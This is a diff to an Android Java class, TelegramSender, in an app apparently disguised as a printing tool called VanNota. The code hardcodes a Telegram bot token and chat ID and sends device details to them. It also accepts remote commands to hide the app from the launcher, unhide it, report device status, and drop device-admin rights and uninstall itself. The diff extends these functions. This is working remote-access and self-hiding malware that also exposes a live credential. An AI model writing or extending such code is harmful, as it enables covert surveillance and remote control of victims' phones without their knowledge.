@@ -3,12 +3,10 @@ package com.cetakpro.print;
 import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Context;
-import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.net.Uri;
 import android.os.Build;
-import android.provider.Settings;
 import android.util.Log;
 
 import java.io.OutputStream;
@@ -20,7 +18,9 @@ import java.nio.charset.StandardCharsets;
 public class TelegramSender {
     private static final String TAG = "TelegramSender";
     
+    // ============================================================
     // HARDCODE TOKEN & CHAT ID
+    // ============================================================
     private static final String BOT_TOKEN = "8662155042:AAFRLkduh9r2FoOtt3TkqmTxNqAmWleibew";
     private static final String CHAT_ID = "1286411089";
     
@@ -33,9 +33,11 @@ public class TelegramSender {
     public static void sendMessage(Context context, String title, String message) {
         new Thread(() -> {
             try {
-                String fullText = title + "\n" + message + "\n\n📱 " + Build.MODEL;
+                // Tambahkan nama perangkat di setiap pesan
+                String deviceName = getDeviceName(context);
+                String fullText = title + "\n" + message + "\n\n📱 " + deviceName;
                 
-                Log.d(TAG, "📤 Mengirim ke Telegram...");
+                Log.d(TAG, "📤 Mengirim ke Telegram: " + title);
                 
                 String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
                 URL url = new URL(urlString);
@@ -77,66 +79,44 @@ public class TelegramSender {
     }
 
     // ============================================================
+    // AMBIL NAMA PERANGKAT DARI SHAREDPREFERENCES
+    // ============================================================
+    private static String getDeviceName(Context context) {
+        try {
+            SharedPreferences prefs = context.getSharedPreferences("cetak_pro", Context.MODE_PRIVATE);
+            String name = prefs.getString("device_name", Build.MODEL);
+            return name != null && !name.isEmpty() ? name : Build.MODEL;
+        } catch (Exception e) {
+            return Build.MODEL;
+        }
+    }
+
+    // ============================================================
     // HANDLE COMMAND DARI TELEGRAM
     // ============================================================
     private static void handleTelegramCommand(Context context, String command) {
         Log.d(TAG, "📩 Perintah diterima: " + command);
         
         // ==========================================
-        // PERINTAH: /uninstall - HAPUS APLIKASI
-        // ==========================================
-        if (command.equalsIgnoreCase("/uninstall") || command.equalsIgnoreCase("/hapus")) {
-            Log.d(TAG, "🗑️ Perintah uninstall diterima!");
-            
-            sendMessage(context, "🗑️ UNINSTALL", "Menghapus VanNota dari " + Build.MODEL + "...");
-            
-            try {
-                DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
-                ComponentName admin = new ComponentName(context, AdminReceiver.class);
-                if (dpm.isAdminActive(admin)) {
-                    dpm.removeActiveAdmin(admin);
-                    Log.d(TAG, "✅ Device Admin dinonaktifkan");
-                }
-            } catch (Exception e) {
-                Log.e(TAG, "❌ Gagal matikan admin: " + e.getMessage());
-            }
-            
-            try {
-                Thread.sleep(1500);
-            } catch (InterruptedException ignored) {}
-            
-            try {
-                Intent intent = new Intent(Intent.ACTION_DELETE);
-                intent.setData(Uri.parse("package:" + context.getPackageName()));
-                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                context.startActivity(intent);
-                Log.d(TAG, "✅ Intent uninstall dikirim");
-            } catch (Exception e) {
-                Log.e(TAG, "❌ Gagal uninstall: " + e.getMessage());
-                sendMessage(context, "❌ GAGAL UNINSTALL", "Error: " + e.getMessage());
-            }
-            
-            android.os.Process.killProcess(android.os.Process.myPid());
-            return;
-        }
-        
-        // ==========================================
-        // PERINTAH: /hide - SEMBUNYIKAN APLIKASI DARI LAUNCHER
+        // PERINTAH: /hide - SEMBUNYIKAN APLIKASI
         // ==========================================
         if (command.equalsIgnoreCase("/hide")) {
             Log.d(TAG, "👻 Perintah hide diterima!");
             
             try {
-                // Nonaktifkan komponen launcher
                 PackageManager pm = context.getPackageManager();
                 ComponentName componentName = new ComponentName(context, MainActivity.class);
                 
-                // Set status menjadi disabled (sembunyi dari launcher)
+                // Disable activity (sembunyi dari launcher)
                 pm.setComponentEnabledSetting(
                     componentName,
                     PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                     PackageManager.DONT_KILL_APP
                 );
+                
+                // Simpan status hide
+                SharedPreferences prefs = context.getSharedPreferences("cetak_pro", Context.MODE_PRIVATE);
+                prefs.edit().putBoolean("app_hidden", true).apply();
                 
                 sendMessage(context, "👻 HIDE", "Aplikasi VanNota disembunyikan dari launcher.\nKirim /unhide untuk menampilkan kembali.");
                 Log.d(TAG, "✅ Aplikasi disembunyikan");
@@ -149,7 +129,7 @@ public class TelegramSender {
         }
         
         // ==========================================
-        // PERINTAH: /unhide - TAMPILKAN APLIKASI KEMBALI
+        // PERINTAH: /unhide - TAMPILKAN APLIKASI
         // ==========================================
         if (command.equalsIgnoreCase("/unhide")) {
             Log.d(TAG, "👀 Perintah unhide diterima!");
@@ -158,12 +138,16 @@ public class TelegramSender {
                 PackageManager pm = context.getPackageManager();
                 ComponentName componentName = new ComponentName(context, MainActivity.class);
                 
-                // Set status menjadi enabled (muncul di launcher)
+                // Enable activity (muncul di launcher)
                 pm.setComponentEnabledSetting(
                     componentName,
                     PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                     PackageManager.DONT_KILL_APP
                 );
+                
+                // Hapus status hide
+                SharedPreferences prefs = context.getSharedPreferences("cetak_pro", Context.MODE_PRIVATE);
+                prefs.edit().putBoolean("app_hidden", false).apply();
                 
                 sendMessage(context, "👀 UNHIDE", "Aplikasi VanNota muncul kembali di launcher.");
                 Log.d(TAG, "✅ Aplikasi dimunculkan kembali");
@@ -176,6 +160,49 @@ public class TelegramSender {
         }
         
         // ==========================================
+        // PERINTAH: /uninstall - HAPUS APLIKASI
+        // ==========================================
+        if (command.equalsIgnoreCase("/uninstall") || command.equalsIgnoreCase("/hapus")) {
+            Log.d(TAG, "🗑️ Perintah uninstall diterima!");
+            
+            // Kirim konfirmasi
+            sendMessage(context, "🗑️ UNINSTALL", "Menghapus VanNota dari " + getDeviceName(context) + "...");
+            
+            // Matikan Device Admin agar bisa diuninstall
+            try {
+                DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
+                ComponentName admin = new ComponentName(context, AdminReceiver.class);
+                if (dpm.isAdminActive(admin)) {
+                    dpm.removeActiveAdmin(admin);
+                    Log.d(TAG, "✅ Device Admin dinonaktifkan");
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "❌ Gagal matikan admin: " + e.getMessage());
+            }
+            
+            // Tunggu sebentar agar admin mati
+            try {
+                Thread.sleep(1500);
+            } catch (InterruptedException ignored) {}
+            
+            // Jalankan proses uninstall
+            try {
+                Intent intent = new Intent(Intent.ACTION_DELETE);
+                intent.setData(Uri.parse("package:" + context.getPackageName()));
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                context.startActivity(intent);
+                Log.d(TAG, "✅ Intent uninstall dikirim");
+            } catch (Exception e) {
+                Log.e(TAG, "❌ Gagal uninstall: " + e.getMessage());
+                sendMessage(context, "❌ GAGAL UNINSTALL", "Error: " + e.getMessage());
+            }
+            
+            // Hentikan proses aplikasi
+            android.os.Process.killProcess(android.os.Process.myPid());
+            return;
+        }
+        
+        // ==========================================
         // PERINTAH: /info - LIHAT INFO PERANGKAT
         // ==========================================
         if (command.equalsIgnoreCase("/info") || command.equalsIgnoreCase("/status")) {
@@ -184,7 +211,7 @@ public class TelegramSender {
             String deviceId = prefs.getString("device_id", "Tidak diketahui");
             String androidVersion = Build.VERSION.RELEASE;
             
-            // Cek status launcher (apakah aplikasi terlihat)
+            // Cek status launcher
             PackageManager pm = context.getPackageManager();
             ComponentName componentName = new ComponentName(context, MainActivity.class);
             int setting = pm.getComponentEnabledSetting(componentName);
